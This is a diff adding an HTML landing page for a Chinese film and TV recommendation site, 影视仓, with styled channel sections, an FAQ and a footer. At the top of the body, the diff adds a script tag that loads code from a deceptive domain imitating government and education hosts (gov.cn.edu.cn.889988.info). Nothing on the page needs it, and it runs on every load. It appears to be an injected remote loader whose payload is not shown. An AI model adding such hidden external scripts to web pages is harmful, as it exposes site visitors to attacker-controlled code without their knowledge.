@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="影视仓(yingshicang-zh)是专业的影视资源导航与影视资讯聚合平台，提供最新电影、热播电视剧、高清综艺、动漫番剧等影视内容推荐与影视行业动态，为影视爱好者打造一站式观影指南。">
+<meta name="keywords" content="影视仓, yingshicang-zh, 影视仓官网, 电影推荐, 电视剧排行, 影视资讯, 综艺节目, 动漫番剧, 高清影视资源">
+<meta name="author" content="影视仓">
+<meta name="robots" content="index, follow">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>影视仓 - 专业影视资源导航与影视资讯平台 | yingshicang-zh</title>
+<style>
+:root{
+  --bg:#0b0f1a;
+  --card:#121829;
+  --line:rgba(255,255,255,.08);
+  --txt:#e8ecf5;
+  --sub:#9aa4bd;
+  --brand:#ff5c39;
+  --brand2:#ff8c42;
+  --accent:#3ddc97;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+  background:var(--bg);
+  color:var(--txt);
+  line-height:1.75;
+  -webkit-font-smoothing:antialiased;
+}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+.container{max-width:1160px;margin:0 auto;padding:0 20px}
+/* header */
+header{
+  position:sticky;top:0;z-index:99;
+  background:rgba(11,15,26,.92);
+  backdrop-filter:blur(10px);
+  border-bottom:1px solid var(--line);
+}
+.nav{display:flex;align-items:center;justify-content:space-between;height:64px}
+.logo{display:flex;align-items:center;gap:10px;font-size:20px;font-weight:800;letter-spacing:.5px}
+.logo span{color:var(--brand)}
+.nav-links{display:flex;gap:28px;font-size:14px;color:var(--sub)}
+.nav-links a{transition:.2s;position:relative;padding:4px 0}
+.nav-links a:hover{color:var(--txt)}
+.nav-links a::after{content:"";position:absolute;left:0;bottom:0;width:0;height:2px;background:var(--brand);transition:.25s}
+.nav-links a:hover::after{width:100%}
+.menu-btn{display:none;flex-direction:column;gap:5px;cursor:pointer;padding:4px}
+.menu-btn i{width:22px;height:2px;background:var(--txt);border-radius:2px;transition:.3s}
+/* hero */
+.hero{
+  padding:90px 0 70px;
+  background:radial-gradient(1200px 500px at 80% -10%,rgba(255,92,57,.18),transparent 60%),
+             radial-gradient(900px 400px at 0% 10%,rgba(61,220,151,.10),transparent 55%);
+  text-align:center;
+}
+.hero .tag{
+  display:inline-block;font-size:13px;color:var(--accent);
+  border:1px solid rgba(61,220,151,.35);border-radius:999px;
+  padding:5px 16px;margin-bottom:22px;letter-spacing:1px;
+}
+.hero h1{font-size:44px;line-height:1.25;font-weight:800;margin-bottom:18px}
+.hero h1 em{font-style:normal;color:var(--brand)}
+.hero p{color:var(--sub);max-width:620px;margin:0 auto 30px;font-size:16px}
+.hero-btns{display:flex;gap:14px;justify-content:center;flex-wrap:wrap}
+.btn{
+  display:inline-flex;align-items:center;gap:8px;
+  padding:12px 26px;border-radius:10px;font-size:15px;font-weight:600;transition:.25s;
+}
+.btn-primary{background:linear-gradient(135deg,var(--brand),var(--brand2));color:#fff}
+.btn-primary:hover{transform:translateY(-2px);box-shadow:0 8px 24px rgba(255,92,57,.35)}
+.btn-ghost{border:1px solid var(--line);color:var(--txt)}
+.btn-ghost:hover{border-color:var(--brand);color:var(--brand)}
+.hero-meta{margin-top:34px;font-size:13px;color:var(--sub)}
+.hero-meta code{background:rgba(255,255,255,.06);padding:3px 10px;border-radius:6px;color:var(--accent);font-size:13px}
+/* section */
+section{padding:72px 0}
+.sec-head{text-align:center;margin-bottom:48px}
+.sec-head .no{font-size:13px;color:var(--brand);letter-spacing:3px;font-weight:700}
+.sec-head h2{font-size:30px;margin-top:8px;font-weight:800}
+.sec-head p{color:var(--sub);margin-top:10px;font-size:15px}
+/* grid cards */
+.grid{display:grid;gap:22px}
+.grid-3{grid-template-columns:repeat(3,1fr)}
+.grid-4{grid-template-columns:repeat(4,1fr)}
+.grid-2{grid-template-columns:repeat(2,1fr)}
+.card{
+  background:var(--card);border:1px solid var(--line);border-radius:14px;
+  padding:26px 24px;transition:.3s;
+}
+.card:hover{transform:translateY(-4px);border-color:rgba(255,92,57,.4);box-shadow:0 12px 30px rgba(0,0,0,.35)}
+.card .ico{width:46px;height:46px;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:22px;margin-bottom:16px;
+  background:linear-gradient(135deg,rgba(255,92,57,.18),rgba(255,140,66,.10));
+}
+.card h3{font-size:18px;margin-bottom:8px}
+.card p{color:var(--sub);font-size:14px}
+/* channel */
+.channel{
+  background:var(--card);border:1px solid var(--line);border-radius:16px;
+  padding:34px 30px;position:relative;overflow:hidden;
+}
+.channel::before{content:"";position:absolute;right:-40px;top:-40px;width:160px;height:160px;border-radius:50%;
+  background:radial-gradient(circle,rgba(255,92,57,.14),transparent 70%);
+}
+.channel .idx{font-size:48px;font-weight:800;color:rgba(255,255,255,.05);position:absolute;right:24px;top:14px;line-height:1}
+.channel h3{font-size:21px;margin-bottom:12px;display:flex;align-items:center;gap:10px}
+.channel h3 i{font-style:normal;font-size:15px;background:var(--brand);color:#fff;padding:2px 10px;border-radius:6px}
+.channel ul{margin-top:14px}
+.channel li{color:var(--sub);font-size:14px;padding:7px 0;border-bottom:1px dashed var(--line);display:flex;justify-content:space-between;gap:10px}
+.channel li:last-child{border:none}
+.channel li b{color:var(--txt);font-weight:600}
+/* faq */
+.faq-item{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:20px 24px;margin-bottom:14px;transition:.2s}
+.faq-item:hover{border-color:rgba(61,220,151,.3)}
+.faq-item h4{font-size:16px;margin-bottom:6px;color:var(--accent)}
+.faq-item p{color:var(--sub);font-size:14px}
+/* cta */
+.cta{text-align:center;padding:80px 20px;border-radius:20px;
+  background:linear-gradient(135deg,rgba(255,92,57,.12),rgba(61,220,151,.08));
+  border:1px solid var(--line);
+}
+.cta h2{font-size:32px;margin-bottom:14px}
+.cta p{color:var(--sub);margin-bottom:26px;font-size:15px}
+/* footer */
+footer{border-top:1px solid var(--line);padding:44px 0 30px;color:var(--sub);font-size:13px}
+.foot-grid{display:grid;grid-template-columns:2fr 1fr 1fr;gap:30px;margin-bottom:30px}
+.foot-brand p{margin-top:10px;font-size:13px;max-width:340px}
+.foot-col h5{color:var(--txt);margin-bottom:12px;font-size:15px}
+.foot-col a{display:block;padding:4px 0;font-size:13px;transition:.2s}
+.foot-col a:hover{color:var(--brand)}
+.copy{text-align:center;border-top:1px solid var(--line);padding-top:22px;font-size:12px}
+.copy a{color:var(--brand)}
+/* responsive */
+@media(max-width:900px){
+  .grid-4{grid-template-columns:repeat(2,1fr)}
+  .grid-3{grid-template-columns:repeat(2,1fr)}
+  .foot-grid{grid-template-columns:1fr 1fr}
+}
+@media(max-width:680px){
+  .menu-btn{display:flex}
+  .nav-links{position:fixed;inset:64px 0 0 0;flex-direction:column;align-items:center;justify-content:center;gap:26px;
+    background:rgba(11,15,26,.98);transform:translateY(-120%);transition:.4s;font-size:16px}
+  .nav-links.open{transform:translateY(0)}
+  .hero h1{font-size:30px}
+  .hero{padding:60px 0 50px}
+  section{padding:54px 0}
+  .sec-head h2{font-size:24px}
+  .grid-3,.grid-4,.grid-2{grid-template-columns:1fr}
+  .foot-grid{grid-template-columns:1fr}
+  .channel{padding:28px 22px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<header>
+  <div class="container nav">
+    <div class="logo">🎬 <span>影视仓</span></div>
+    <nav class="nav-links" id="navLinks">
+      <a href="#home">首页</a>
+      <a href="#movie">电影频道</a>
+      <a href="#tv">剧集频道</a>
+      <a href="#variety">综艺动漫</a>
+      <a href="#news">行业资讯</a>
+      <a href="#faq">常见问题</a>
+    </nav>
+    <div class="menu-btn" id="menuBtn"><i></i><i></i><i></i></div>
+  </div>
+</header>
+
+<section class="hero" id="home">
+  <div class="container">
+    <span class="tag">✦ 影视仓 · 你的专属观影导航</span>
+    <h1>发现好剧好片，尽在 <em>影视仓</em></h1>
+    <p>影视仓（yingshicang-zh）聚焦影视内容推荐与行业资讯整合，覆盖电影、电视剧、综艺、动漫四大板块，为影迷提供清晰的内容入口与及时的影视动态。</p>
+    <div class="hero-btns">
+      <a class="btn btn-primary" href="#movie">开始探索 →</a>
+      <a class="btn btn-ghost" href="#news">了解影视仓</a>
+    </div>
+    <div class="hero-meta">官方站点：<code>https://yingshicang-zh.github.io</code></div>
+  </div>
+</section>
+
+<section id="movie">
+  <div class="container">
+    <div class="sec-head">
+      <div class="no">01 / MOVIE</div>
+      <h2>电影频道</h2>
+      <p>从院线热映到经典回顾，影视仓为你梳理值得一看的影片</p>
+    </div>
+    <div class="grid grid-4">
+      <div class="card"><div class="ico">🔥</div><h3>热映推荐</h3><p>追踪当下票房与口碑双高的院线新片，快速了解看点。</p></div>
+      <div class="card"><div class="ico">🏆</div><h3>高分经典</h3><p>历久弥新的影史佳作盘点，类型齐全，适合反复品味。</p></div>
+      <div class="card"><div class="ico">🌏</div><h3>海外佳片</h3><p>精选海外电影节获奖作品与地区特色电影介绍。</p></div>
+      <div class="card"><div class="ico">🎞️</div><h3>类型专题</h3><p>悬疑、科幻、爱情、动作等分类专题，按口味选片。</p></div>
+    </div>
+  </div>
+</section>
+
+<section id="tv">
+  <div class="container">
+    <div class="sec-head">
+      <div class="no">02 / TV SERIES</div>
+      <h2>剧集频道</h2>
+      <p>追剧不迷路，热门国产剧、美剧、日韩剧一站掌握</p>
+    </div>
+    <div class="grid grid-2">
+      <div class="channel">
+        <div class="idx">01</div>
+        <h3>国产剧集 <i>热播</i></h3>
+        <p>聚焦大陆与港台地区的热播剧、年代剧、悬疑剧，跟进更新节奏与观众口碑。</p>
+        <ul>
+          <li><span><b>都市情感</b> 现实题材持续走热</span><span>更新中</span></li>
+          <li><span><b>古装历史</b> 制作水准逐年提升</span><span>热播</span></li>
+          <li><span><b>悬疑犯罪</b> 短剧集形态受关注</span><span>推荐</span></li>
+          <li><span><b>年代传奇</b> 家国叙事引发共鸣</span><span>经典</span></li>
+        </ul>
+      </div>
+      <div class="channel">
+        <div class="idx">02</div>
+        <h3>海外剧集 <i>追更</i></h3>
+        <p>美剧、英剧、日剧、韩剧同步资讯，涵盖剧情介绍与播出时间整理。</p>
+        <ul>
+          <li><span><b>美剧</b> 季播剧集与限定剧并存</span><span>追更</span></li>
+          <li><span><b>韩剧</b> 题材多元，流媒体分发加速</span><span>热播</span></li>
+          <li><span><b>日剧</b> 社会议题与治愈系并行</span><span>推荐</span></li>
+          <li><span><b>英剧</b> 短小精悍，口碑稳定</span><span>经典</span></li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="variety">
+  <div class="container">
+    <div class="sec-head">
+      <div class="no">03 / VARIETY & ANIME</div>
+      <h2>综艺 · 动漫</h2>
+      <p>轻松下饭的综艺与值得追更的番剧，都在影视仓</p>
+    </div>
+    <div class="grid grid-3">
+      <div class="card"><div class="ico">🎤</div><h3>综艺节目</h3><p>音乐、竞技、生活、访谈等多类型综艺盘点，捕捉话题与看点。</p></div>
+      <div class="card"><div class="ico">🎨</div><h3>国漫番剧</h3><p>国产动画新作与经典续作追踪，关注制作进展与播出动态。</p></div>
+      <div class="card"><div class="ico">🗾</div><h3>日韩动漫</h3><p>新番导视与经典回顾，涵盖剧场版与 TV 动画资讯。</p></div>
+    </div>
+  </div>
+</section>
+
+<section id="news">
+  <div class="container">
+    <div class="sec-head">
+      <div class="no">04 / INSIGHT</div>
+      <h2>影视行业资讯</h2>
+      <p>影视仓关注产业动态，带你读懂行业变化</p>
+    </div>
+    <div class="grid grid-3">
+      <div class="card"><div class="ico">📈</div><h3>市场观察</h3><p>票房数据、观影趋势、流媒体格局变化等内容整理与分析。</p></div>
+      <div class="card"><div class="ico">🎬</div><h3>影视仓视点</h3><p>围绕内容创作、题材变迁与观众口味变化展开观点分享。</p></div>
+      <div class="card"><div class="ico">📅</div><h3>档期日历</h3><p>重要档期片单、定档信息与节庆播出安排一览。</p></div>
+    </div>
+  </div>
+</section>
+
+<section id="faq">
+  <div class="container">
+    <div class="sec-head">
+      <div class="no">05 / FAQ</div>
+      <h2>常见问题</h2>
+      <p>关于影视仓，你可能想了解的</p>
+    </div>
+    <div class="faq-wrap">
+      <div class="faq-item"><h4>影视仓是什么？</h4><p>影视仓（yingshicang-zh）是一个影视内容推荐与行业资讯整合站点，覆盖电影、电视剧、综艺、动漫等板块。</p></div>
+      <div class="faq-item"><h4>影视仓提供影视资源下载吗？</h4><p>影视仓主要提供内容推荐与资讯导航，不存储也不提供任何影视资源的下载或在线播放。</p></div>
+      <div class="faq-item"><h4>如何获取最新的影视资讯？</h4><p>定期访问影视仓即可浏览各频道更新，也可关注对应板块获取分类内容。</p></div>
+      <div class="faq-item"><h4>影视仓的官方网址是什么？</h4><p>官方站点为 https://yingshicang-zh.github.io，请认准此域名访问。</p></div>
+    </div>
+  </div>
+</section>
+
+<section>
+  <div class="container">
+    <div class="cta">
+      <h2>打开影视仓，开启你的观影清单</h2>
+      <p>电影、剧集、综艺、动漫——影视仓帮你把内容找齐</p>
+      <a class="btn btn-primary" href="#home">返回顶部 ↑</a>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="container">
+    <div class="foot-grid">
+      <div class="foot-brand">
+        <div class="logo">🎬 <span>影视仓</span></div>
+        <p>影视仓（yingshicang-zh）致力于为影视爱好者提供内容推荐与行业资讯服务。</p>
+      </div>
+      <div class="foot-col">
+        <h5>栏目导航</h5>
+        <a href="#movie">电影频道</a>
+        <a href="#tv">剧集频道</a>
+        <a href="#variety">综艺动漫</a>
+        <a href="#news">行业资讯</a>
+      </div>
+      <div class="foot-col">
+        <h5>关于我们</h5>
+        <a href="#faq">常见问题</a>
+        <a href="#home">站点介绍</a>
+        <a href="#home">免责说明</a>
+      </div>
+    </div>
+    <div class="copy">
+      © 2026 影视仓 yingshicang-zh · 官方网址 <a href="https://yingshicang-zh.github.io">https://yingshicang-zh.github.io</a> · 本站仅供影视内容推荐与资讯参考
+    </div>
+  </div>
+</footer>
+
+<script>
+document.getElementById('menuBtn').addEventListener('click',function(){
+  document.getElementById('navLinks').classList.toggle('open');
+});
+document.querySelectorAll('.nav-links a').forEach(function(a){
+  a.addEventListener('click',function(){document.getElementById('navLinks').classList.remove('open');});
+});
+</script>
+</body>
+</html>
